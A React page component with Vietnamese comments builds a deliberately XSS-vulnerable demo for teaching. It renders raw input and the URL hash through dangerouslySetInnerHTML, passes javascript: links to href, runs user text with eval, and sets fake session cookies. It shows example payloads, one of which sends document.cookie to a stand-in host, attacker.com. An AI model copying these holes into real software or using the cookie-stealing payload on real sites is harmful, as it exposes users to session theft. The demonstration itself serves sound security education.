/* 
 * Trang minh hoa XSS CO LO HONG
 * Không được dùng code này trong sản phẩm thật.
 */
"use client";

import { useEffect, useState } from "react";

export default function XssVulnerablePage() {
  // 1. Reflected XSS qua form + dangerouslySetInnerHTML
  const [rawInput, setRawInput] = useState("");
  const [output, setOutput] = useState("");

  // 2. XSS qua URL / link do user nhập
  const [rawUrl, setRawUrl] = useState("javascript:alert('XSS qua href')");

  // 3. DOM XSS đọc từ location.hash
  const [hashContent, setHashContent] = useState("");

  // 4. XSS khi eval / dynamic script
  const [evalCode, setEvalCode] = useState(
    "alert('XSS qua eval: ' + document.domain);"
  );

  // 5. Demo cookie giả + đọc cookie từ document.cookie
  const [cookieString, setCookieString] = useState("");

  const handleRender = () => {
    // CỐ TÌNH LỖ HỔNG:
    // - Gán thẳng input user vào dangerouslySetInnerHTML
    // - Không validate, không escape
    setOutput(rawInput);
  };

  useEffect(() => {
    if (typeof window !== "undefined") {
      // CỐ TÌNH LỖ HỔNG DOM-BASED XSS: đọc thẳng hash và render vào DOM
      const hash = window.location.hash.slice(1); // bỏ dấu #
      setHashContent(hash);

      // Tạo một số cookie GIẢ để demo việc XSS có thể đánh cắp
      // Tuyệt đối không làm thế này với dữ liệu thật.
      const expires = new Date();
      expires.setTime(expires.getTime() + 60 * 60 * 1000); // 1 giờ

      document.cookie = `auth_token=fake_jwt_123456; path=/; expires=${expires.toUTCString()}`;
      document.cookie = `user_id=123; path=/; expires=${expires.toUTCString()}`;
      document.cookie = `theme=dark; path=/; expires=${expires.toUTCString()}`;

      setCookieString(document.cookie);
    }
  }, []);

  const handleEval = () => {
    // CỐ TÌNH LỖ HỔNG: không bao giờ được eval code từ user trong thực tế
    // eslint-disable-next-line no-eval
    eval(evalCode);
  };

  return (
    <div className="stack">
      <div className="card danger">
        <p className="danger-label">
          ● Nguy hiểm: Ví dụ XSS CÓ lỗ hổng – chỉ dùng để demo
        </p>
        <h2>Trang XSS có lỗ hổng</h2>
        <p>
          TẤT CẢ ví dụ bên dưới đều CỐ TÌNH chứa lỗ hổng XSS. Không dùng kiểu
          code này trong sản phẩm thật.
        </p>

        {/* 1. Reflected XSS qua dangerouslySetInnerHTML */}
        <section className="stack">
          <h3>1. Reflected XSS – dangerouslySetInnerHTML</h3>
          <p>
            Bất cứ HTML / JavaScript nào bạn nhập vào bên dưới sẽ được render
            trực tiếp vào DOM mà không được kiểm tra.
          </p>
          <p>
            Ví dụ payload:{" "}
            <code>{'<img src=x onerror="alert(\'XSS\')" />'}</code>
          </p>

          <div className="input-row">
            <input
              placeholder="Nhập HTML hoặc script ở đây..."
              value={rawInput}
              onChange={(e) => setRawInput(e.target.value)}
            />
            <button type="button" onClick={handleRender}>
              Render nguy hiểm
            </button>
          </div>

          <div>
            <p>Kết quả (đã chèn thẳng vào DOM):</p>
            <div
              className="output-box"
              dangerouslySetInnerHTML={{ __html: output }}
            />
          </div>
        </section>

        {/* 2. XSS qua URL / href do user nhập */}
        <section className="stack">
          <h3>2. XSS qua thuộc tính href (javascript: URL)</h3>
          <p>
            Ở đây người dùng có thể nhập bất kỳ URL nào, kể cả{" "}
            <code>javascript:</code>. Link bên dưới sẽ dùng trực tiếp giá trị
            này.
          </p>
          <p>
            Ví dụ payload: <code>javascript:alert(&apos;XSS qua link&apos;)</code>
          </p>

          <div className="input-row">
            <input
              placeholder="Nhập URL (kể cả javascript:...)"
              value={rawUrl}
              onChange={(e) => setRawUrl(e.target.value)}
            />
          </div>

          <p>
            Link nguy hiểm:{" "}
            <a href={rawUrl}>Bấm vào đây (không an toàn)</a>
          </p>
        </section>

        {/* 3. DOM-based XSS qua location.hash */}
        <section className="stack">
          <h3>3. DOM-based XSS qua location.hash</h3>
          <p>
            Nội dung sau dấu <code>#</code> trên URL được đọc thẳng và render
            vào DOM bằng <code>dangerouslySetInnerHTML</code>.
          </p>
          <p>
            Ví dụ, truy cập:{" "}
            <code>
              /xss-vulnerable#&lt;img src=x onerror=&quot;alert(&apos;XSS
              hash&apos;)&quot; /&gt;
            </code>
          </p>

          <div>
            <p>Nội dung từ hash (không kiểm tra):</p>
            <div
              className="output-box"
              dangerouslySetInnerHTML={{ __html: hashContent }}
            />
          </div>
        </section>

        {/* 4. XSS qua eval / dynamic JS */}
        <section className="stack">
          <h3>4. XSS qua eval / dynamic script</h3>
          <p>
            Code dưới đây sẽ chạy trực tiếp với <code>eval</code> mỗi khi bạn
            bấm nút.
          </p>
          <p>
            Ví dụ payload:{" "}
            <code>alert(&apos;Eval XSS &apos; + document.cookie)</code>
          </p>

          <textarea
            style={{ width: "100%", minHeight: 80 }}
            value={evalCode}
            onChange={(e) => setEvalCode(e.target.value)}
          />
          <button type="button" onClick={handleEval}>
            Chạy code bằng eval (rất nguy hiểm)
          </button>
        </section>

        {/* 5. Demo cookie giả + đọc cookie */}
        <section className="stack">
          <h3>5. Cookie giả + cách XSS lấy cookie</h3>
          <p>
            Khi bạn mở trang này, một số cookie GIẢ (ví dụ{" "}
            <code>auth_token</code>, <code>user_id</code>) được set trên{" "}
            <code>document.cookie</code> chỉ để demo.
          </p>
          <p>
            Trong tấn công XSS thực tế, attacker có thể dùng JavaScript để đọc{" "}
            <code>document.cookie</code> và gửi về server của hắn.
          </p>

          <p>
            Cookie hiện tại trong trình duyệt (demo):{" "}
            <code>{cookieString || "(không đọc được cookie)"}</code>
          </p>
          <p>
            Ví dụ payload XSS đánh cắp cookie (giả lập):{" "}
            <code>
              {`&lt;img src=&quot;https://attacker.com/steal?c=&quot; + encodeURIComponent(document.cookie) /&gt;`}
            </code>
          </p>
        </section>
      </div>
    </div>
  );
}


